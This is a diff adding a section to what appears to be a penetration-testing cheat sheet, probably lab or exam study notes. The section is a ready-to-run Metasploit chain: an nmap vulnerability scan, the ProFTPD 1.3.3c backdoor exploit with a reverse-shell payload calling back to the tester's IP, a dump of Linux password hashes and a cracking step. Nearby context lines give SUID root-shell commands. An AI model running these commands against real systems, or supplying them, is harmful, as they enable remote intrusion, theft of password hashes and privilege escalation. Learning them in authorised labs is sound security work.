@@ -329,6 +329,42 @@ exploit
 | Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
 | Make binary SUID | `chmod u+s /tmp/bash` |
 
+---
+### 🐚 ProFTPD 1.3.3c Exploit → Hashdump → Cracking → Hash ID Reference
+
+# 1. Scan for vulnerabilities on port 21 (FTP)
+nmap --script vuln -p 21 <target>
+
+# 2. Launch ProFTPD 1.3.3c backdoor exploit
+msfconsole -q
+use exploit/unix/ftp/proftpd_133c_backdoor
+set payload cmd/unix/reverse
+set RHOSTS <target>
+set LHOST <your_ip>
+exploit -z  # run in background
+
+# 3. Dump Linux password hashes from the session
+use post/linux/gather/hashdump
+set SESSION <session_id>
+exploit
+
+# 4. Analyze and attempt to crack hashes
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
+
+
+# 5. Linux /etc/shadow hash prefix reference:
+# -------------------------------
+# Value  →  Hashing Algorithm
+# $1     →  MD5
+# $2     →  Blowfish
+# $5     →  SHA-256
+# $6     →  SHA-512
+# -------------------------------
+---
+
+
 ### 🧠 Privilege Escalation via Writable Script + `sudo` Misconfiguration
 
 1. **Locate writable script or suspicious file access**:
